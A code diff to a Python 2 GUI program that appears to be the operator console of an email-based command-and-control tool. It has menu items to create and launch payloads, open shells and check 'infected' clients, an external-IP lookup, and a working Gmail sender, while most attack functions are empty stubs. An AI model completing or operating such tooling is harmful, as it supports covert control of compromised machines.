@@ -1,5 +1,70 @@
 #! /usr/bin/python2
 
+import PySimpleGUI27 as sg
+#import threading as th #may cause problems
+import time #timing the checkup so that a client isnt flooded with checkups
+import sys
+import os
+import re
+import glob
+import pwd
+import itertools
+import smtplib
+from requests import get
+
+external_ip = get('https://api.ipify.org').text
+
+server_username = 'PLACEHOLDER'
+server_password = 'PLACEHOLDER'
+
+sent_from = server_username
+
+currentDir = os.getcwd()
+
+
+def populateAccounts(): #returns a dictionary of lists of accounts
+  #example format returned: {0: ['account1@mail.com', 'password1'], 1: ['account2@mail.com', 'password2'], 2: ['account3@mail.com', 'password3']}
+  dirtyaccountList = open(currentDir + "/config/accountList", 'r+b').readlines()
+  accounts= {}
+  counter = 0
+  for account in dirtyaccountList[:-1]:
+    accounts[counter] = account.strip().split(':')
+    accounts[counter].append("unknown")
+    counter = counter + 1
+  return accounts
+def populateClients():
+  dirtyClientList = open(currentDir + "/config/clientList", 'r+b').readlines()
+  clients = {}
+  counter = 0
+  for client in dirtyClientList[:-1]:
+    clients[counter] = client.strip().split(":")
+    clients[counter].append("unknown")
+    counter = counter + 1
+  return clients
+
+accounts = populateAccounts()
+clients = populateClients()
+
+
+menu_def = [['&File', ['Edit Modules', 'Edit ProxyList', ]],
+            ['&Edit', ['Config', ['Proxy', 'Module', ]]],
+            ['&Help', '&About']]
+
+mainLayout = [[sg.Menu(menu_def, tearoff=True)], [sg.Text("Account to send from:", size=(138, 1), justification="right")],
+          [sg.Combo(["Create Payload", "Launch Payload", "Open shell", "Check Status of Clients",
+                     "Check Status of ProxyChains"], size=(100, 10), enable_events=False, readonly=True),
+           sg.Listbox(values=(accounts.values()), size=(50, 20))],
+          #    [sg.Radio("Command String", "Create your own command to send", default=True, size=(30,2)),sg.Radio("Activate Module", "Use a predifined module on client", default=True, size=(30,2))],
+          [sg.Button("Execute", size=(20, 2), button_color=["red", "black"])],
+          [sg.Text("Notes", size=(120, 2)), sg.Text("Target Client", size=(15, 2))],
+          [sg.Multiline(autoscroll=True, size=(100, 10), do_not_clear=True),
+           sg.Listbox(values=(clients.values()), size=(50, 10))],
+          [sg.Button("Save", tooltip='Click to save notes for client', button_color=["black", "white"]),
+           sg.Button('Add Client', button_color=["black", "white"]),
+           sg.Button('Add Module', button_color=["black", "white"]),
+           sg.Button('Add Account', button_color=["black", "white"]),
+           sg.Button("Clear", button_color=["black", "white"]), sg.Button('Exit', button_color=["black", "red"])]]
+
 #Sample Layouts
 
 #  column1 = [[sg.Text('Column 1', background_color='lightblue', justification='center', size=(10, 1))],
@@ -32,33 +97,6 @@
 #     sg.InputText('Default Folder'), sg.FolderBrowse()],
 #    [sg.Submit(tooltip='Click to submit this form'), sg.Cancel()]]
 
-import PySimpleGUI27 as sg
-#import threading as th #may cause problems
-import time #timing the checkup so that a client isnt flooded with checkups
-import sys
-import os
-
-currentDir = os.getcwd()
-
-def populateAccounts(): #returns a dictionary of lists of accounts
-  #example format returned: {0: ['account1@mail.com', 'password1'], 1: ['account2@mail.com', 'password2'], 2: ['account3@mail.com', 'password3']}
-  dirtyaccountList = open(currentDir + "/config/accountList", 'r+b').readlines()
-  accounts= {}
-  counter = 0
-  for account in dirtyaccountList[:-1]:
-    accounts[counter] = account.strip().split(':')
-    counter = counter + 1
-  return accounts
-def populateClients():
-  dirtyClientList = open(currentDir + "/config/clientList", 'r+b').readlines()
-  clients = {}
-  counter = 0
-  for client in dirtyClientList[:-1]:
-    clients[counter] = client.strip().split(":")
-    counter = counter + 1
-  return clients
-
-
 def startup():
   layout = [[sg.Text('Please enter the name of your server:')],[sg.InputText()],[sg.Submit(), sg.Cancel()]]
   window = sg.Window('Project0', layout)
@@ -68,20 +106,7 @@ def startup():
   return ServerName
 
 def main(ServerName): #main window layout for managing clients
-  accounts = populateAccounts()
-  clients = populateClients()
-
-  menu_def = [['&File',['Edit Modules','Edit ProxyList',]],
-            ['&Edit', ['Config', ['Proxy', 'Module', ]]],
-            ['&Help', '&About']]
-  layout = [[sg.Menu(menu_def, tearoff=True)],[sg.Text("Account to send from:", size=(138,1), justification="right")],
-    [sg.Combo(["Create Payload", "Launch Payload", "Open shell", "Check Status of Clients", "Check Status of ProxyChains"],size=(100,10),enable_events=False,readonly=True),sg.Listbox(values=(accounts.values()), size=(50, 20))],
-#    [sg.Radio("Command String", "Create your own command to send", default=True, size=(30,2)),sg.Radio("Activate Module", "Use a predifined module on client", default=True, size=(30,2))],
-    [sg.Button("Execute", size=(20,2),button_color=["red","black"])],
-    [sg.Text("Notes", size=(120,2)),sg.Text("Target Client", size=(15,2))],
-    [sg.Multiline(autoscroll=True,size=(100,10),do_not_clear=True),sg.Listbox(values=(clients.values()), size=(50, 10))],
-    [sg.Button("Save", tooltip='Click to save notes for client',button_color=["black","white"]),sg.Button('Add Client',button_color=["black","white"]),sg.Button('Add Module',button_color=["black","white"]), sg.Button('Add Account',button_color=["black","white"]), sg.Button("Clear",button_color=["black","white"]), sg.Button('Exit',button_color=["black","red"])]]
-  window = sg.Window(ServerName, layout)
+  window = sg.Window(ServerName, mainLayout)
   while True:
     event, values = window.Read()
     if event is None or event == 'Exit':
@@ -113,7 +138,13 @@ def createPayload(): #create a command payload to be saved somewhere
   pass
 def status(): #keeps a live running update of whether the client is live or dead
   pass
-def checkup(): #module used to essentially "ping" the client to check if it is alive or dead
+def fullCheckup(): #module used to essentially "ping" the client to check if it is alive or dead
+  pass
+def singleCheckup(): #check whether a single client is alive
+  pass
+def singleAccount(accountName, accountPass): #Checks whether the account being sent to is alive or dead, by sending a "ping" from the account back to the server recieving account
+  mailSender(server_username, accountName, accountPass, "Test",'','')
+
   pass
 def readUpdate(): #client will send periodic updates of the infected system, this keeps track of it
   pass
@@ -148,6 +179,7 @@ def addAccount(): #add email account to the "Available" section
 def readAll(): #read all emails within an account
   pass
 def processEmail(accountDetails): #logs in to account, makes sure the address is valid, if not red out in the select account list
+  
   pass
 
 def openFileBox():
@@ -160,6 +192,24 @@ def openFileBox():
 def popUpError(ErrorMessage):
   sg.PopupError('PopupError')
   pass
+def mailSender(reUsers, seUser,sePass,subject,text,filenames): #the actual sending of the email is handled here, fragmenting and obfuscation done elsewhere
+  email_text = """\
+From: %s
+To: %s
+Subject: %s
+
+%s
+""" % (seUser, ", ".join(reUsers), subject, text)
+
+  server = smtplib.SMTP('smtp.gmail.com', 587)
+  server.ehlo()
+  server.starttls()
+
+  server.login(seUser, sePass)
+  server.sendmail(seUser, ", ".join(reUsers), email_text)
+def mailChecker(accountName, accountPass, serverName): #returns all recent emails received by the account from the main server
+  pass
+
 
 main(startup())
 #addAccount()
